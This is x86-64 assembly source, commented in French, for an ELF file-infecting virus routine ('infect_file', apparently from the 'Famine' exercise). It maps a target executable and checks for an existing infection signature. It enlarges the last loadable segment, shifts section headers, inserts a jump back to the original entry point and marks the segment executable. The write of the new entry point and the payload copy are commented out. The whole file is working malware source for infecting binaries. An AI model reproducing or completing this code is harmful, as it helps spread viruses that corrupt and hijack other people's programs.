; void  infect_file(char *filename, t_famine, *famine);
infect_file:
    mov r12, rdi
    lea rdi, [r12 + fileName]
    mov rsi, O_RDWR
    mov rax, SYS_OPEN
    syscall              ; open(filemane, O_RDWR)
    cmp rax, 0           ; if (fd < 0) return ;
    jl bad_fd
    mov [r12 + fd], rax
get_file_data:
    mov rdi, [r12 + fd]
    xor rsi, rsi
    mov rdx, SEEK_END
    mov rax, SYS_LSEEK
    syscall             ; lseek(fd, 0, SEEK_END)
    mov [r12 + fileSize], rax
    cmp rax, 0          ; if (size < 0) return ;
    jl close_file
    cmp rax, SIGNATURE_SIZE          ; if (size > SIGNATURE_SIZE) continue ;
    jge file_size_ok
    lea rdi, [r12 + fileName]
    call append_signature
    jmp close_file
    file_size_ok:                                                                                               ;faire un check si le fichier est pas assez grand et le passer dans la fonction append_signature
    
    xor rdi, rdi
    mov rsi, [r12 + fileSize]
    add rsi, PROG_SIZE                      ; ajoute la taille du programe si on se met a le ragouter
    mov rdx, PROT_READ | PROT_WRITE
    mov r10, MAP_SHARED ; r10 est le 4 ieme argument car rcx et r11 sont détruit par le kernel
    mov r8, [r12 + fd]
    xor r9, r9
    mov rax, SYS_MMAP
    syscall             ; mmap(0, fileSize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
    cmp rax, 0          ; if (!fileData) return ;
    jz  close_file
    mov [r12 + fileData], rax   ; faire des check pour le format

check_signature:                ; boucle sur tout les bytes du fichier pour voir si il n'y a pas deja une signature
    xor rdx, rdx
    lea rax, [rel signature]
    mov rbx, [r12 + fileSize]
    sub rbx, SIGNATURE_SIZE - 1
    jmp check_signature_cmp
    check_signature_loop:
        mov rdi, rax
        mov rsi, [r12 + fileData]
        add rsi, rdx
        mov rcx, SIGNATURE_SIZE  
        repz cmpsb
        jz close_mmap           ; on quite proprement si il y a deja une signature
        inc rdx  
    check_signature_cmp:
    cmp rdx, rbx
    jl check_signature_loop
    
check_file_integrity:
    mov rdi, [r12 + fileData]
    cmp dword [rdi], 0x464c457f ; magic number 0x7f454c46 464c457f
	jnz simple
	mov sil, [rdi + s_support]
	cmp sil, 1			; cmp 32 bit
	je simple
	bit_64:
    ; check if the file is bigger than an ELF_HEADER_FILE
    xor rax, rax
    mov rsi, [r12 + fileSize]
	cmp rsi, 64
	jl simple

	; check if the file is bigger than pheader info indicated
	mov ax, [rdi + e_phentsize]
	mov cx, [rdi + e_phnum]
	mul cx
	cmp rsi, rax
	jl simple

	; check if the file is bigger than the sheader info indicated
	mov ax, [rdi + e_shentsize]
	mov cx, [rdi + e_shnum]
	mul cx
	add rax, [rdi + e_shoff]
	cmp rax, rsi
	jne simple
    jmp get_file_entry

simple: 
    lea rdi, [r12 + fileName]
    call append_signature
    jmp close_mmap


get_file_entry:                     ; recupere l'entry point de l'executable
    mov rax, [r12 + fileData]
    mov rdi, [rax + e_entry]
    mov [r12 + oldEntry], rdi
    

get_last_pload:
    mov r13, [r12 + fileData]     ; r13 = famine->filedata;
    xor rax, rax                  ; mise a 0
    xor rdi, rdi
    xor rbx, rbx
    xor rdx, rdx
    mov di, [r13 + e_phnum]
    mov rsi, [r13 + e_phoff]
    mov dx, [r13 + e_phentsize]
phead_loop:
    cmp dword [r13 + rsi + p_type], PT_LOAD                    ; boucle sur tout les pheader et quand on trouve le premier pload on sort de la boucle
    jnz no_pload
    mov rbx, rsi
    no_pload:
    inc rax
    add rsi, rdx
    cmp rax, rdi
    jl phead_loop
    cmp dword [r13 + rbx + p_type], PT_LOAD
    jnz close_mmap                    ;on quite si il n'y a pas de pload trouvé
last_pload_found:                                                                                              ; faire un check pour voir si on a la place d'écrire 
    add r13, rbx
    mov [r12 + pload], r13
increase_file_size:
    mov rdi, [r12 + fd]
    mov rsi, [r12 + fileData]
    mov rdx, 2048
    mov rax, SYS_WRITE
    syscall                     ;write(fd, filedata, PROG_SIZE);
    
relocate_section_header:
    mov rsi, [r12 + fileData]
    mov rdx, [r13 + p_offset]
    add rdx, [r13 + p_filesz]
    add rsi, rdx
    mov rdi, rsi



    mov rbx, rdi
    
    
    
    add rdi, 2048
    mov rcx, [r12 + fileSize]
    sub rcx, rdx
    mov rdx, rcx
    call ft_memrcpy
    
    mov rdi, rbx
    mov rcx, rdx        ; int i = len
    xor rax, rax        ; char c = '\0'
    rep stosb           ; while (i--) s[i] = c

change_header:
    add qword [r12 + fileSize], 2048
    mov rax, [r12 + fileData]
    add qword [rax + e_shoff], 2048

change_section_header:
    xor rbx, rbx
    xor rcx, rcx
    xor rdx, rdx
    mov rax, [r12 + fileData]
    mov bx, [rax + e_shnum]
    mov cx, [rax + e_shentsize]
    add rax, [rax + e_shoff]
    mov rsi, [r13 + p_offset]
    add rsi, [r13 + p_filesz]
    section_header_loop:
    cmp [rax + sh_offset], rsi
    jl no_section_change
    add qword [rax + sh_offset], 2048
    add qword [rax + sh_addr], 2048
    no_section_change:
    inc rdx
    add rax, rcx
    cmp rdx, rbx
    jle section_header_loop

write_virus_entry:
    mov rdi, [r13 + p_vaddr]             ; met l'entry a la fin du dernier pload = p_vaddr + p_memsz
    add rdi, [r13 + p_memsz]
    mov [r12 + entry], rdi
    mov rsi, [r12 + fileData]           ; écrit la nouvelle entry dans l'executable
;    mov [rsi + e_entry], rdi


copy_program:
    mov rdi, [r12 + fileData]               ; address a la fin du premier pload
    add rdi, [r13 + p_offset]
    add rdi, [r13 + p_filesz]
    mov rbx, rdi
    lea rsi, [rel main]                     ; address du debut du programe
    mov rcx, PROG_SIZE                      ; taille du programe
;    rep movsb
    
    ; calcule le jump qu'il faut faire pour attendre l'entry normale 
    mov rdx, [r12 + entry]
    add rdx, JMP_OFFSET + 5
    mov rcx, [r12 + oldEntry]
    sub ecx, edx
    
    ; ecrit le jump a l'adress de jump
    mov [rbx + JMP_OFFSET], byte 0xE9 ; 0xe9 = jmp
    mov [rbx + JMP_OFFSET + 1], ecx
    ; augmente la taille du premier pload
    add qword [r13 + p_memsz], 2048
    add qword [r13 + p_filesz], 2048

    or dword [r13 + p_flags], PF_X           ; ajoute les droit d'execution
    
close_mmap:
    mov rdi, [r12 + fileData]
    mov rsi, [r12 + fileSize]
    mov rax, SYS_MUNMAP 
    syscall             ; munmap(fileData, fileSize)

close_file:
    mov rdi, [r12 + fd]
    mov rax, SYS_CLOSE  
    syscall             ; close(fd)
bad_fd:
    ret
